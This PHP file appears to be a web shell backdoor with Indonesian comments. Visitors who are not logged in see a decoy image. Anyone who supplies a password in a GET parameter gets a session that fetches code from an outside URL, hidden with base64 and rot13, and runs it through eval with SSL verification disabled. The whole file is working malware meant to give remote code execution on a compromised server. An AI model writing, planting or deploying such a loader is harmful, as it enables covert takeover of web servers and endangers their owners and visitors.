<?php

error_reporting(0);
ini_set('display_errors', 0);

session_start();

function is_logged_in() {
    return isset($_SESSION['R10TXER']);
}

function login($password) {
    $valid_password_hash = '$2y$10$lXpKVu9hodfNClMYqXcHKuPkDoI7GuvErI4g9ds1XbHEN.BVuv2Fq'; // Contoh hash bcrypt
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['R10TXER'] = 'user';
        return true;
    } else {
        return false;
    }
}

function logout() {
    unset($_SESSION['R10TXER']);
}

if (isset($_GET['password'])) {
    $password = $_GET['password'];
    if (login($password)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error_message = "Password salah!";
        echo '<script>alert("'.$error_message.'");</script>';
    }
}

function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    if ($content === false) {
        $content = file_get_contents($url);
    }
    return $content;
}

function encode_url($url) {
    $encoded_url = base64_encode($url);
    $encoded_url = str_rot13($encoded_url);
    return urlencode($encoded_url);
}

function decode_url($encoded_url) {
    $decoded_url = str_rot13(urldecode($encoded_url));
    return base64_decode($decoded_url);
}

$encoded_url = 'nUE0pUZ6Yl9lLKphrzI2MKWcrP5wo20ipzS3Y215LJkzLF01Zmp%3D';
$decoded_url = decode_url($encoded_url);
if (is_logged_in()) {
    if ($decoded_url) {
        $content = getContent($decoded_url);
        eval('?>' . $content);
        exit;
    }
} else {
    // Menampilkan gambar default jika tidak ada login
    header('Content-Type: image/jpeg');
    $image_path = 'https://i.postimg.cc/85swKVHG/teambubadibako-gf92dl-removebg-preview.png';
    readfile($image_path);
}

?>

